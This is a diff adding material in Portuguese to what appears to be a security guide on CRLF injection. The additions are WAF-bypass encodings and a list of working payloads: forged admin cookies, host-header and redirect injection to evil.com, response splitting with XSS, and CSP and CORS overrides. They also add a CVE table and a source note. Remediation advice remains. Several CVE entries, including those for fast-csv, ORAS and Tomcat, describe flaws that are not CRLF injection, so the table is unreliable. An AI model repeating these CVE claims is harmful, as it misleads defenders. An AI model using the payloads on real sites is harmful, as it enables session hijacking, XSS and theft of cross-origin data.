@@ -82,6 +82,38 @@ Bypasses de WAF:
 - Injeção via header de proxy (X-Forwarded-Host, X-Original-URL)
 - Injeção em nome de cookie/atributo
 - Quebra de linha em multipart/form-data
+- Hash prefix bypass: `#%0a`, `%23%0D%0A`
+- Unicode escape: `%u000A`, `%u000D`
+- Path traversal combo: `%2e%2e%2f%0d%0a`, `%2F..%0d%0a`
+```
+
+Payloads avancados de exploit:
+```text
+# Cookie injection via CRLF
+%0d%0aSet-Cookie:crlf=injection
+%0d%0aSet-Cookie:admin=true;Path=/;HttpOnly
+
+# Host header injection
+%0d%0ahost:%20attacker.com
+%0d%0aX-Forwarded-Host:%20evil.com
+
+# Response splitting com XSS
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('XSS')</script>
+%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
+
+# CSP bypass via header injection
+%0d%0aContent-Security-Policy:%20default-src%20*
+
+# CORS bypass via header injection
+%0d%0aAccess-Control-Allow-Origin:%20https://evil.com%0d%0aAccess-Control-Allow-Credentials:%20true
+
+# Location redirect override
+%0d%0aLocation:%20https://evil.com
+
+# Combinacoes de encoding agressivas
+%25%30%61
+%E5%98%8A%E5%98%8DSet-Cookie:crlf=1
+%0d%0a%20%20%20%20injected-header:%20value
 ```
 
 Casos reais e mentalidade de ataque (RWBH): Twitter e Yahoo (headers refletidos) ilustram response splitting, `Set-Cookie` forjado e envenenamento de cache; o atacante testa `%0d%0a`, dupla codificação e headers de proxy.
@@ -123,6 +155,18 @@ Sinais de que a CRLF injection detectada pelo scanner **nao e exploravel**:
 - **Reflexao em corpo, nao em header:** o scanner marca CRLF porque o valor `%0d%0a` aparece na resposta, mas ele esta no corpo HTML (nao em um header HTTP) -- isso nao e CRLF injection, pode ser XSS se renderizado.
 - **CRLF apenas em logs:** o payload afeta apenas logs do servidor, sem impacto na resposta HTTP ao cliente. Log injection e uma vulnerabilidade separada e de menor severidade.
 
+## Notable CVEs
+
+| CVE | Produto | Ano | Descricao | Tipo |
+|-----|---------|-----|-----------|------|
+| CVE-2023-25690 | Apache HTTP Server 2.4.0-2.4.55 | 2023 | CRLF injection via mod_proxy com RewriteRule -- permite request splitting e HTTP response smuggling | CRLF to Request Splitting |
+| CVE-2024-24549 | Apache Tomcat | 2024 | Trailer headers nao validados permitem injecao de CRLF em respostas HTTP/2 | HTTP/2 CRLF Injection |
+| CVE-2021-21272 | ORAS (OCI Registry) | 2021 | CRLF injection em hostname do registry -- permite redirecionar pull para servidor malicioso | Header Injection |
+| CVE-2020-26256 | fast-csv (Node.js) | 2020 | CRLF injection em campos CSV permite injecao de formulas e linhas adicionais -- exportacao manipulada | CSV Injection via CRLF |
+| CVE-2019-18277 | HAProxy | 2019 | CRLF injection via transfer-encoding permite HTTP request smuggling entre HAProxy e backends | CRLF to Request Smuggling |
+
+Fonte: cvelistV5 (MITRE CVE List v5 dataset)
+
 ## Recommendation
 1. Rejeitar qualquer entrada que contenha `\r`, `\n` ou caracteres de controle antes de inserir em headers; usar validação de allowlist.
 2. Usar APIs do framework que codificam headers automaticamente; nunca concatenar strings em `Location`/`Set-Cookie`.
@@ -142,4 +186,7 @@ public void redirect(HttpServletResponse res, String target) throws IOException 
 }
 ```
 9. Testar respostas com `curl -i` e inspecionar headers/corpo após cada entrada.
+
+## Sources
+- Colecao de payloads CRLF (crlf.txt) -- 63 payloads cobrindo encoding bypass, response splitting, header injection e cookie injection.
 
